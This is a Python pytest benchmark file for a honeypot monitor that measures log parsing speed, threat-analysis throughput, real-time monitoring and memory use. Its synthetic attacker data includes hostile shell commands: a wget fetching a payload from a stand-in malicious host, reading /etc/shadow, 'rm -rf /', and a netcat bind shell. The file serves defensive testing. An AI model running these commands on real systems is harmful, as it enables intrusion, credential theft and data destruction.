#!/usr/bin/env python3
"""
Performance benchmarks for honeypot monitor components.
Tests processing speed, memory usage, and scalability.
"""

import pytest
import time
import tempfile
import os
import threading
import psutil
import gc
from datetime import datetime, timedelta
from unittest.mock import Mock, patch
from pathlib import Path

from honeypot_monitor.services.log_parser import KippoLogParser
from honeypot_monitor.services.threat_analyzer import ThreatAnalyzer
from honeypot_monitor.services.log_monitor import LogMonitor
from honeypot_monitor.services.event_manager import EventManager, EventType
from honeypot_monitor.models.log_entry import LogEntry
from tests.test_integration.mock_data.sample_kippo_logs import MockKippoLogs


class TestParsingPerformance:
    """Test parsing performance with various log sizes."""
    
    def generate_large_log_dataset(self, num_entries):
        """Generate a large dataset of log entries."""
        log_templates = [
            "2024-01-15 {time}+0000 [SSHService ssh-connection on HoneyPotTransport,{session},{ip}] login attempt [root/password] succeeded",
            "2024-01-15 {time}+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,{session},{ip}] CMD: {command}",
            "2024-01-15 {time}+0000 [SSHService ssh-connection on HoneyPotTransport,{session},{ip}] connection lost",
            "2024-01-15 {time}+0000 [SSHService ssh-connection on HoneyPotTransport,{session},{ip}] login attempt [admin/admin] failed",
        ]
        
        commands = [
            "ls -la", "cat /etc/passwd", "wget http://malicious.com/payload.sh", 
            "uname -a", "ps aux", "netstat -an", "chmod +x script.sh", 
            "./malware", "rm -rf /tmp/*", "history -c"
        ]
        
        logs = []
        base_time = datetime(2024, 1, 15, 10, 0, 0)
        
        for i in range(num_entries):
            template = log_templates[i % len(log_templates)]
            current_time = base_time + timedelta(seconds=i)
            session_id = (i // 10) + 1
            ip = f"192.168.{(i // 256) % 256}.{(i % 256) + 1}"
            command = commands[i % len(commands)]
            
            log_line = template.format(
                time=current_time.strftime("%H:%M:%S"),
                session=session_id,
                ip=ip,
                command=command
            )
            logs.append(log_line)
        
        return logs
    
    @pytest.mark.parametrize("num_entries", [1000, 5000, 10000, 25000])
    def test_parsing_speed_scalability(self, num_entries):
        """Test parsing speed with different dataset sizes."""
        logs = self.generate_large_log_dataset(num_entries)
        parser = KippoLogParser()
        
        start_time = time.time()
        parsed_count = 0
        failed_count = 0
        
        for log_line in logs:
            try:
                entry = parser.parse_entry(log_line)
                if entry:
                    parsed_count += 1
                else:
                    failed_count += 1
            except Exception:
                failed_count += 1
        
        end_time = time.time()
        processing_time = end_time - start_time
        entries_per_second = parsed_count / processing_time if processing_time > 0 else 0
        
        print(f"\nParsing Performance ({num_entries} entries):")
        print(f"  Parsed: {parsed_count}")
        print(f"  Failed: {failed_count}")
        print(f"  Time: {processing_time:.3f}s")
        print(f"  Speed: {entries_per_second:.1f} entries/sec")
        
        # Performance requirements
        assert parsed_count > num_entries * 0.8, f"Too many parsing failures: {failed_count}/{num_entries}"
        assert entries_per_second > 500, f"Parsing too slow: {entries_per_second:.1f} entries/sec"
        assert processing_time < num_entries / 100, f"Processing time too long: {processing_time:.3f}s"
    
    def test_memory_efficiency_during_parsing(self):
        """Test memory usage during large-scale parsing."""
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        logs = self.generate_large_log_dataset(50000)
        parser = KippoLogParser()
        
        # Parse in batches to monitor memory usage
        batch_size = 1000
        memory_samples = []
        
        for i in range(0, len(logs), batch_size):
            batch = logs[i:i + batch_size]
            
            for log_line in batch:
                try:
                    parser.parse_entry(log_line)
                except Exception:
                    pass
            
            current_memory = process.memory_info().rss / 1024 / 1024  # MB
            memory_samples.append(current_memory - initial_memory)
        
        max_memory_increase = max(memory_samples)
        final_memory_increase = memory_samples[-1]
        
        print(f"\nMemory Usage During Parsing:")
        print(f"  Initial: {initial_memory:.2f}MB")
        print(f"  Max increase: {max_memory_increase:.2f}MB")
        print(f"  Final increase: {final_memory_increase:.2f}MB")
        
        # Memory requirements
        assert max_memory_increase < 200, f"Memory usage too high: {max_memory_increase:.2f}MB"
        assert final_memory_increase < 100, f"Memory leak detected: {final_memory_increase:.2f}MB"


class TestThreatAnalysisPerformance:
    """Test threat analysis performance."""
    
    def create_threat_test_entries(self, num_entries):
        """Create log entries with varying threat levels."""
        entries = []
        base_time = datetime.now()
        
        # Mix of benign and malicious commands
        benign_commands = ["ls", "pwd", "whoami", "date", "uptime"]
        malicious_commands = [
            "wget http://malicious.com/payload.sh",
            "chmod +x malware",
            "./backdoor",
            "cat /etc/shadow",
            "rm -rf /",
            "nc -l -p 4444 -e /bin/sh"
        ]
        
        for i in range(num_entries):
            # 70% benign, 30% malicious for realistic distribution
            if i % 10 < 7:
                command = benign_commands[i % len(benign_commands)]
            else:
                command = malicious_commands[i % len(malicious_commands)]
            
            entry = LogEntry(
                timestamp=base_time + timedelta(seconds=i),
                session_id=f"session_{i // 20}",
                event_type="command",
                source_ip=f"192.168.1.{(i % 254) + 1}",
                message=f"CMD: {command}",
                command=command
            )
            entries.append(entry)
        
        return entries
    
    @pytest.mark.parametrize("num_entries", [1000, 5000, 10000])
    def test_threat_analysis_speed(self, num_entries):
        """Test threat analysis speed with different dataset sizes."""
        entries = self.create_threat_test_entries(num_entries)
        analyzer = ThreatAnalyzer()
        
        start_time = time.time()
        threat_count = 0
        
        for entry in entries:
            threat = analyzer.analyze_entry(entry)
            if threat and threat.severity in ['medium', 'high', 'critical']:
                threat_count += 1
        
        end_time = time.time()
        processing_time = end_time - start_time
        analyses_per_second = num_entries / processing_time if processing_time > 0 else 0
        
        print(f"\nThreat Analysis Performance ({num_entries} entries):")
        print(f"  Threats detected: {threat_count}")
        print(f"  Time: {processing_time:.3f}s")
        print(f"  Speed: {analyses_per_second:.1f} analyses/sec")
        
        # Performance requirements
        assert threat_count > 0, "Should detect some threats"
        assert analyses_per_second > 1000, f"Analysis too slow: {analyses_per_second:.1f} analyses/sec"
        assert processing_time < num_entries / 500, f"Processing time too long: {processing_time:.3f}s"
    
    def test_pattern_detection_performance(self):
        """Test performance of pattern detection across multiple entries."""
        entries = self.create_threat_test_entries(5000)
        analyzer = ThreatAnalyzer()
        
        start_time = time.time()
        
        # Group entries by session for pattern analysis
        sessions = {}
        for entry in entries:
            if entry.session_id not in sessions:
                sessions[entry.session_id] = []
            sessions[entry.session_id].append(entry)
        
        patterns_detected = 0
        for session_entries in sessions.values():
            if len(session_entries) > 3:  # Only analyze sessions with multiple entries
                patterns = analyzer.detect_patterns(session_entries)
                patterns_detected += len(patterns)
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        print(f"\nPattern Detection Performance:")
        print(f"  Sessions analyzed: {len(sessions)}")
        print(f"  Patterns detected: {patterns_detected}")
        print(f"  Time: {processing_time:.3f}s")
        
        # Performance requirements
        assert processing_time < 5.0, f"Pattern detection too slow: {processing_time:.3f}s"


class TestRealTimeMonitoringPerformance:
    """Test real-time monitoring performance."""
    
    def test_file_monitoring_responsiveness(self):
        """Test responsiveness of file monitoring to new log entries."""
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log') as temp_file:
            log_file_path = temp_file.name
        
        try:
            event_manager = EventManager()
            parser = KippoLogParser()
            monitor = LogMonitor(event_manager, parser)
            
            # Track processing times
            processing_times = []
            processed_entries = []
            
            def log_handler(event):
                processing_time = time.time() - event.data.timestamp.timestamp()
                processing_times.append(processing_time)
                processed_entries.append(event.data)
            
            event_manager.subscribe(EventType.LOG_ENTRY, log_handler)
            
            # Start monitoring
            monitor.start_monitoring(log_file_path)
            time.sleep(0.1)  # Allow monitor to initialize
            
            # Write log entries with timestamps
            test_logs = MockKippoLogs.basic_session_logs()
            
            start_time = time.time()
            for i, log_line in enumerate(test_logs):
                # Modify timestamp to current time for accurate measurement
                current_time = datetime.now()
                modified_log = log_line.replace("2024-01-15 10:30:15", current_time.strftime("%Y-%m-%d %H:%M:%S"))
                
                with open(log_file_path, 'a') as f:
                    f.write(modified_log + '\n')
                
                time.sleep(0.1)  # Small delay between writes
            
            # Wait for processing
            time.sleep(1.0)
            
            monitor.stop_monitoring()
            event_manager.shutdown()
            
            # Analyze responsiveness
            if processing_times:
                avg_processing_time = sum(processing_times) / len(processing_times)
                max_processing_time = max(processing_times)
                
                print(f"\nReal-time Monitoring Performance:")
                print(f"  Entries processed: {len(processed_entries)}")
                print(f"  Avg processing time: {avg_processing_time:.3f}s")
                print(f"  Max processing time: {max_processing_time:.3f}s")
                
                # Performance requirements
                assert len(processed_entries) > 0, "Should process some entries"
                assert avg_processing_time < 0.5, f"Average processing too slow: {avg_processing_time:.3f}s"
                assert max_processing_time < 2.0, f"Max processing too slow: {max_processing_time:.3f}s"
        
        finally:
            os.unlink(log_file_path)
    
    def test_concurrent_processing_performance(self):
        """Test performance with multiple concurrent log sources."""
        num_sources = 5
        entries_per_source = 1000
        
        event_manager = EventManager(worker_threads=4)
        processed_count = threading.BoundedSemaphore(0)
        total_processed = 0
        processing_lock = threading.Lock()
        
        def log_handler(event):
            nonlocal total_processed
            with processing_lock:
                total_processed += 1
            processed_count.release()
        
        event_manager.subscribe(EventType.LOG_ENTRY, log_handler)
        
        start_time = time.time()
        
        # Simulate multiple concurrent log sources
        def simulate_log_source(source_id):
            parser = KippoLogParser()
            logs = MockKippoLogs.get_all_scenarios()
            
            for i in range(entries_per_source):
                log_line = logs[i % len(logs)]
                try:
                    entry = parser.parse_entry(log_line)
                    if entry:
                        # Modify to make unique per source
                        entry.source_ip = f"192.168.{source_id}.{i % 254 + 1}"
                        event_manager.publish_log_entry(entry)
                except Exception:
                    pass
                
                if i % 100 == 0:
                    time.sleep(0.01)  # Small delay to simulate realistic timing
        
        # Start all sources concurrently
        threads = []
        for source_id in range(num_sources):
            thread = threading.Thread(target=simulate_log_source, args=(source_id,))
            thread.start()
            threads.append(thread)
        
        # Wait for all sources to complete
        for thread in threads:
            thread.join()
        
        # Wait for processing to complete
        expected_total = num_sources * entries_per_source
        timeout = 30.0
        start_wait = time.time()
        
        while total_processed < expected_total * 0.9 and (time.time() - start_wait) < timeout:
            time.sleep(0.1)
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        event_manager.shutdown()
        
        throughput = total_processed / processing_time if processing_time > 0 else 0
        
        print(f"\nConcurrent Processing Performance:")
        print(f"  Sources: {num_sources}")
        print(f"  Expected entries: {expected_total}")
        print(f"  Processed entries: {total_processed}")
        print(f"  Processing time: {processing_time:.3f}s")
        print(f"  Throughput: {throughput:.1f} entries/sec")
        
        # Performance requirements
        assert total_processed > expected_total * 0.8, f"Too many entries lost: {total_processed}/{expected_total}"
        assert throughput > 1000, f"Concurrent throughput too low: {throughput:.1f} entries/sec"
        assert processing_time < 20.0, f"Concurrent processing too slow: {processing_time:.3f}s"


class TestMemoryPerformance:
    """Test memory usage and management."""
    
    def test_memory_usage_with_large_datasets(self):
        """Test memory usage with large in-memory datasets."""
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Create large dataset
        entries = []
        batch_size = 10000
        num_batches = 5
        
        memory_samples = []
        
        for batch in range(num_batches):
            batch_entries = []
            for i in range(batch_size):
                entry = LogEntry(
                    timestamp=datetime.now(),
                    session_id=f"session_{i % 1000}",
                    event_type="command",
                    source_ip=f"192.168.{(i // 256) % 256}.{(i % 256) + 1}",
                    message=f"test message {i} with some additional content to increase memory usage",
                    command=f"test command {i} --with --multiple --parameters --and --long --arguments"
                )
                batch_entries.append(entry)
            
            entries.extend(batch_entries)
            
            current_memory = process.memory_info().rss / 1024 / 1024  # MB
            memory_increase = current_memory - initial_memory
            memory_samples.append(memory_increase)
            
            print(f"Batch {batch + 1}: {len(entries)} entries, Memory: +{memory_increase:.2f}MB")
        
        peak_memory = max(memory_samples)
        final_memory = memory_samples[-1]
        
        # Test memory cleanup
        del entries
        gc.collect()
        
        cleanup_memory = process.memory_info().rss / 1024 / 1024 - initial_memory
        
        print(f"\nMemory Performance:")
        print(f"  Initial: {initial_memory:.2f}MB")
        print(f"  Peak increase: {peak_memory:.2f}MB")
        print(f"  Final increase: {final_memory:.2f}MB")
        print(f"  After cleanup: {cleanup_memory:.2f}MB")
        
        # Memory requirements
        assert peak_memory < 500, f"Peak memory usage too high: {peak_memory:.2f}MB"
        assert cleanup_memory < final_memory * 0.5, f"Memory not properly cleaned up: {cleanup_memory:.2f}MB"
    
    def test_memory_leak_detection(self):
        """Test for memory leaks during repeated operations."""
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        parser = KippoLogParser()
        analyzer = ThreatAnalyzer()
        
        # Perform repeated operations
        num_iterations = 100
        memory_samples = []
        
        for iteration in range(num_iterations):
            # Create and process entries
            entries = []
            for i in range(100):
                log_line = f"2024-01-15 10:30:{i:02d}+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: test command {i}"
                
                try:
                    entry = parser.parse_entry(log_line)
                    if entry:
                        entries.append(entry)
                        analyzer.analyze_entry(entry)
                except Exception:
                    pass
            
            # Clear entries
            del entries
            
            if iteration % 10 == 0:
                gc.collect()
                current_memory = process.memory_info().rss / 1024 / 1024  # MB
                memory_increase = current_memory - initial_memory
                memory_samples.append(memory_increase)
                
                if len(memory_samples) > 1:
                    memory_trend = memory_samples[-1] - memory_samples[0]
                    print(f"Iteration {iteration}: Memory +{memory_increase:.2f}MB (trend: +{memory_trend:.2f}MB)")
        
        final_memory = process.memory_info().rss / 1024 / 1024 - initial_memory
        memory_growth = memory_samples[-1] - memory_samples[0] if len(memory_samples) > 1 else 0
        
        print(f"\nMemory Leak Detection:")
        print(f"  Initial: {initial_memory:.2f}MB")
        print(f"  Final increase: {final_memory:.2f}MB")
        print(f"  Memory growth: {memory_growth:.2f}MB")
        
        # Memory leak requirements
        assert memory_growth < 50, f"Potential memory leak detected: {memory_growth:.2f}MB growth"
        assert final_memory < 100, f"Final memory usage too high: {final_memory:.2f}MB"


if __name__ == "__main__":
    # Run performance benchmarks
    pytest.main([__file__, "-v", "-s"])